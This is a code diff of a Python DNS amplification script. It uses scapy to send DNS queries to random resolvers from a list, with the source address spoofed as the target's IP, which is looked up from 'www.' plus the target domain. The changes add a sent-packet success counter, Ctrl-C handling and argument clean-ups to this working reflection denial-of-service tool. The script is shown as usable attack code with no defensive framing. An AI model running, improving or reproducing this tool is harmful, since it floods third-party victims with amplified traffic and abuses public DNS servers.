@@ -6,7 +6,6 @@
 
 import os
 import sys
-import unittest
 import socket
 import random
 from multiprocessing.dummy import Pool as ThreadPool
@@ -18,10 +17,13 @@ global DNS_IP_LIST
 DNS_IP_LIST = []
 global FAKE_IP
 FAKE_IP = ''
+global SUCCESS
+SUCCESS = 0
 
 #----------------------------------------------------------------------
 def dns_amp(qname_address):
     """"""
+    global SUCCESS
     dns_ip = random.choice(DNS_IP_LIST)
     a = IP(dst=dns_ip,src=FAKE_IP) 
     b = UDP(dport=53)
@@ -30,6 +32,11 @@ def dns_amp(qname_address):
     p = a/b/c
     try:
         send(p)
+        SUCCESS += 1
+    except KeyboardInterrupt:
+        print('FATAL: Quit!')
+        print('Success: ' + str(SUCCESS))
+        exit()
     except Exception as e:
         print('WARNING: DNSTest failed: %s' % e)
         traceback.print_exc()
@@ -62,11 +69,11 @@ if __name__=='__main__':
     time = int(sys.argv[2])
     thread_num = int(sys.argv[3])
     try:
-        FAKE_IP = str((sys.argv[4]))
+        FAKE_IP = str(sys.argv[4])
     except:
         FAKE_IP = socket.getaddrinfo("www." + address, 80, 0, 0, socket.SOL_TCP)[0][4][0]
     try:
-        dns_filename = str((sys.argv[5]))
+        dns_filename = str(sys.argv[5])
     except:
         dns_filename = './nameservers.csv'
     try:
@@ -77,4 +84,4 @@ if __name__=='__main__':
     DNS_IP_LIST = read_dns_ip(dns_filename)
     print('Start!')
     main(address, time, length, thread_num, FAKE_IP)
-    print('Done!')
+    print('Done! Success: ' + str(SUCCESS))
